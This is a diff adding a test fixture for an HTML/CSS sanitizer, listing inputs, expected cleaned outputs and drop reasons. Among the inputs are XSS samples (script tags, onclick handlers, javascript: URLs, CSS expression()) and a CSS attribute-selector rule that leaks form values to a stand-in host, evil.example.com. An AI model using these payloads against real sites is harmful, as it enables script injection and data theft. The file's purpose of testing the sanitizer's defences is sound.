@@ -1,0 +1,148 @@
+profile: embed-v1
+version: 1
+
+=== HTML ===
+
+--- plain
+in  : "<h1>Hello</h1><p>A <strong>short</strong> page.</p>"
+out : "<h1>Hello</h1><p>A <strong>short</strong> page.</p>"
+
+--- links
+in  : "<a href=\"/about\">rel</a><a href=\"https://example.com\" target=\"_blank\">abs</a>"
+out : "<a href=\"/about\">rel</a><a href=\"https://example.com\">abs</a>"
+drop: forbidden_attribute "target" (attribute not in allowlist for tag)
+
+--- link_with_rel
+in  : "<a href=\"/x\" rel=\"author noopener\" target=\"_blank\">x</a>"
+out : "<a href=\"/x\">x</a>"
+drop: forbidden_attribute "rel" (attribute not in allowlist for tag)
+drop: forbidden_attribute "target" (attribute not in allowlist for tag)
+
+--- images
+in  : "<img src=\"/assets/a.png\" alt=\"a\" width=\"10\" height=\"10\"><img src=\"https://evil.example.com/b.png\">"
+out : "<img src=\"/assets/a.png\" alt=\"a\" width=\"10\" height=\"10\"><img>"
+drop: external_resource "https://evil.example.com/b.png" (asset URL does not match any allowed prefix)
+
+--- data_image
+in  : "<img src=\"data:image/png;base64,AAAA\" alt=\"d\"><img src=\"data:image/svg+xml,<svg/>\">"
+out : "<img src=\"data:image/png;base64,AAAA\" alt=\"d\"><img>"
+drop: external_resource "data:image/svg+xml,<svg/>" (data: media type not allowed)
+
+--- script
+in  : "<p>before</p><script>alert(1)</script><p>after</p>"
+out : "<p>before</p><p>after</p>"
+drop: forbidden_element "script" (tag is always forbidden)
+
+--- handlers
+in  : "<p onclick=\"alert(1)\" class=\"keep\" id=\"gb-shell-x\">t</p>"
+out : "<p class=\"keep\">t</p>"
+drop: event_handler "onclick" (event handler attributes are forbidden)
+drop: forbidden_attribute "id" (attribute not in allowlist for tag)
+
+--- js_url
+in  : "<a href=\"javascript:alert(1)\">a</a><a href=\"java&#9;script:alert(1)\">b</a>"
+out : "<a>a</a><a>b</a>"
+drop: forbidden_url "javascript:alert(1)" (forbidden URL scheme: javascript)
+drop: forbidden_url "java\tscript:alert(1)" (unparseable URL)
+
+--- nesting
+in  : "<div><section><p>deep <em>and <strong>deeper</strong></em></p></section></div>"
+out : "<div></div>"
+drop: forbidden_element "section" (tag not in allowlist)
+
+--- unclosed
+in  : "<div><p>one<p>two<span>three"
+out : "<div><p>one<p>two<span>three</span></p></p></div>"
+
+--- self_closing
+in  : "<a/><br/><img/><p/>"
+out : "<a><br><img><p></p></a>"
+
+--- table
+in  : "<table><thead><tr><th scope=\"col\">h</th></tr></thead><tbody><tr><td colspan=\"2\">c</td></tr></tbody></table>"
+out : ""
+drop: forbidden_element "table" (tag not in allowlist)
+
+--- entities
+in  : "<p>a &amp; b &lt; c &#65; &copy;</p>"
+out : "<p>a &amp; b &lt; c A ©</p>"
+
+--- comment
+in  : "<p>a<!-- secret -->b</p>"
+out : "<p>ab</p>"
+drop: comment "// comment" (HTML comments are not allowed)
+
+--- foreign
+in  : "<svg><circle/></svg><math><mi>x</mi></math>"
+out : ""
+drop: forbidden_element "svg" (tag is always forbidden)
+drop: forbidden_element "math" (tag is always forbidden)
+
+--- srcset
+in  : "<source srcset=\"/assets/a.png 1x, /assets/b.png 2x\" type=\"image/png\">"
+out : "<source srcset=\"/assets/a.png 1x, /assets/b.png 2x\" type=\"image/png\">"
+
+=== CSS ===
+
+--- basic
+in  : "h1 { color: navy; margin: 0 0 1rem }"
+out : "h1{color:navy;margin:0 0 1rem;}"
+
+--- media
+in  : "@media screen and (min-width: 600px) { p { color: red } h1 { font-size: 2rem } }"
+out : "@media screen and (min-width: 600px){p{color:red;}h1{font-size:2rem;}}"
+
+--- supports
+in  : "@supports (display:grid) { .g { display: grid } }"
+out : "@supports (display:grid){.g{display:grid;}}"
+
+--- nested_media
+in  : "@media screen { @media print { p { color: red } } }"
+out : "@media screen{@media print{p{color:red;}}}"
+
+--- functions
+in  : ".c { width: calc(100% - 2rem); color: rgb(1 2 3 / .5); background: linear-gradient(180deg,#fff,#eee) }"
+out : ".c{width:calc(100% - 2rem);color:rgb(1 2 3 / .5);background:linear-gradient(180deg,#fff,#eee);}"
+
+--- url_ok
+in  : ".h { background-image: url('/assets/hero.png') }"
+out : ""
+drop: forbidden_css_rule "background-image" (property not in allowlist)
+
+--- url_bad
+in  : ".h { background-image: url('https://evil.example.com/x.png') }"
+out : ""
+drop: forbidden_css_rule "background-image" (property not in allowlist)
+
+--- forbidden
+in  : "@import url('https://evil.example.com/x.css'); p { width: expression(alert(1)) }"
+out : ""
+drop: forbidden_css_rule "@import" (@-rule not in allowlist)
+drop: forbidden_css_function "expression" (function not in allowlist)
+
+--- universal
+in  : "* { color: red } .ok { color: blue }"
+out : ".ok{color:blue;}"
+drop: forbidden_css_rule "*" (universal selector is forbidden)
+
+--- shell_ns
+in  : ".gb-shell-main { color: red } .mine { color: blue }"
+out : ".mine{color:blue;}"
+drop: forbidden_css_rule ".gb-shell-main" (selector targets shell namespace)
+
+--- attr_selector
+in  : "input[value^=\"a\"] { background: url(\"https://evil.example.com/?c=a\") }"
+out : ""
+drop: forbidden_css_rule "input[value^=\"a\"]" (attribute selectors are not allowed)
+
+--- custom_props
+in  : ":where(.t) { --brand: #06f; color: var(--brand) }"
+out : ":where(.t){--brand:#06f;color:var(--brand);}"
+
+--- comments
+in  : "/* c */ p /* c */ { color: red /* c */ }"
+out : "p{color:red;}"
+
+--- pseudo
+in  : "a:hover { color: red } a:has(b) { color: blue }"
+out : "a:hover{color:red;}a:has(b){color:blue;}"
